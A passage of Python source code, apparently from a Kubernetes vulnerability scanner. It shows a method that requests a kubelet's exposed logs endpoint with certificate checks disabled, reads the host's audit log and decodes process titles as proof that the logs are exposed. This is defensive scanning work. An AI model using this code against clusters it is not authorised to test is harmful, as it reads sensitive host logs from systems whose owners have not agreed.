        self.event = event
        self.base_url = f"https://{self.event.host}:{self.event.port}"

    def execute(self):
        config = get_config()
        audit_logs = self.event.session.get(
            f"{self.base_url}/" + KubeletHandlers.LOGS.value.format(path="audit/audit.log"),
            verify=False,
            timeout=config.network_timeout,
        )

        # TODO: add more methods for proving system logs
        if audit_logs.status_code == requests.status_codes.codes.OK:
            logger.debug(f"Audit log of host {self.event.host}: {audit_logs.text[:10]}")
            # iterating over proctitles and converting them into readable strings
            proctitles = []
            for proctitle in re.findall(r"proctitle=(\w+)", audit_logs.text):
                proctitles.append(bytes.fromhex(proctitle).decode("utf-8").replace("\x00", " "))
            self.event.proctitles = proctitles
            self.event.evidence = f"audit log: {proctitles}"
        else:
            self.event.evidence = "Could not parse system logs"
